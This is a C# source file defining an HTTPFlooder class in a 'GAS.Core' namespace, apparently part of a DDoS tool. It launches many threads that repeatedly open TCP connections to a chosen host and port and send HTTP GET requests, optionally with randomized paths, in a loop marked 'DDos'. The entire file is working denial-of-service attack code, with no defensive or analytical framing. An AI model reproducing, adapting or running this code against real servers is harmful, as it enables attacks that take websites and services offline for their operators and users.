using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
    public class HTTPFlooder : IAttacker
    {
        bool init = false;
        public IPAddress IP, DNS;
        public int Port;
        public string Subsite;
        private Random rnd = new Random();
        private bool random, usegZip, IPOrDns = true, Resp;
        private Thread[] WorkingThreads;
        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount)
        {
            ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.IsDelayed = false;
            try { this.DNS = IPAddress.Parse(dns); }
            catch { this.DNS = this.IP; }
            try { this.IP = IPAddress.Parse(ip); }
            catch
            {
                this.IP = null;
                this.IPOrDns = false;
            }
            this.Port = port;
            this.Subsite = subSite;
            this.Resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this.random = random;
            this.usegZip = usegzip;
        }
        public override void Start()
        {
            if (IsFlooding)
                Stop();
            IsDelayed = false;
            IsFlooding = true;
            for (int i = 0; i < ThreadCount; i++)
                (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
            init = true;
        }
        private void bw_DoWork(object indexinthreads)
        {
            while (!init)
                Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int) indexinthreads;
            try
            {
                #region Prepare
                int bfsize = 1024; // this should be less than the MTU
                byte[] buf = System.Text.Encoding.ASCII.GetBytes(
                    String.Format(random ? "GET {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}{4}{2}" :
                                          "GET {0} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}{4}{2}",
                                          Subsite,
                                          Functions.RandomString(),
                                          Environment.NewLine,
                                          DNS,
                                          ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
                                          "")));
                byte[] recvBuf = new byte[bfsize];
                int recvd = 0;
                #endregion
                #region DDos
                while (IsFlooding)
                {
                    #region Old Source
                    /*
                    State = ReqState.Ready;
                    try
                    {
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        State = ReqState.Connecting;
                        socket.Connect(this.IPOrDns? IP:DNS, Port);
                        socket.Blocking = Resp;
                        State = ReqState.Requesting;
                        socket.ReceiveTimeout = Timeout;
                        socket.Send(buf, SocketFlags.None);
                        State = ReqState.Downloading; Requested++;
                        if (Resp)
                            try
                            {
                                recvd = 0;
                                do { recvd = socket.Receive(recvBuf); }
                                while ((recvd > bfsize) && socket.Connected);
                                Downloaded++;
                            }
                            catch { Failed++; }
                        socket.Close();
                        State = ReqState.Completed;
                    }
                    catch { Failed++; }
                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);*/
                    #endregion
                    #region New source
                    States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
                    recvBuf = new byte[bfsize];
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
                    try { socket.Connect(this.IPOrDns ? IP : DNS, Port); } catch { continue; }
                    socket.Blocking = Resp;
                    States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                    socket.Send(buf, SocketFlags.None);
                    States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                        Requested++;
                        if (Resp)
                        {
                            try
                            {
                                recvd = 0;
                                do { recvd = socket.Receive(recvBuf); }
                                while (false);//(recvd > bfsize) && socket.Connected);
                                Downloaded++;
                            }
                            catch
                            {
                                Failed++;
                            }
                        }
                    States[MY_INDEX_FOR_WORK] = ReqState.Completed; 
                        Downloaded++;
                    if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
                    #endregion
                }
                #endregion
            }
            catch { }
            finally {}
        }
        public override void Stop()
        {
            IsFlooding = false;
            try
            {
                foreach (var x in WorkingThreads)
                {
                    try
                    {
                        x.Abort();
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}